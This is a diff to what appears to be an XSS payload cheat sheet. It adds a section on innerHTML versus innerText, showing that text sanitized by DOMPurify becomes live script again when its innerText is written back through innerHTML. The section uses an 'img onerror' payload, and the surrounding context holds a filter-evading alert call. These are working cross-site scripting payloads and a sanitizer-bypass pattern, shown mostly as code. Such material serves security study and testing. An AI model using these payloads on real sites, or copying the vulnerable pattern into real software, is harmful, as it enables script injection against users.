@@ -64,6 +64,27 @@ self[Object.keys(self)[5]]("XSS")
 >>> Array(316) [ "close", "stop", "focus", "blur", "open", "alert", "confirm", "prompt", "print", "postMessage", … ]
 ```
 
+### innerHTML vs innerText
+
+```html
+<head>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.3.6/purify.min.js"></script>
+</head>
+<body>
+	<p id="input">&lt;img src=x onerror=alert() /&gt;</p>
+	<p id="tmp"></p>
+	<p id="output"></p>
+
+	<script>
+		console.log(input.innerText); // <img src=x onerror="alert()" />
+		console.log(input.innerHTML); // &lt;img src=x onerror="alert()" /&gt;
+		let clean = DOMPurify.sanitize(input.innerHTML);
+		tmp.innerHTML = clean; // No XSS
+		output.innerHTML = tmp.innerText; // XSS here
+	</script>
+</body>
+```
+
 ### Anchors fuzzing
 
 #### Javascript protocol
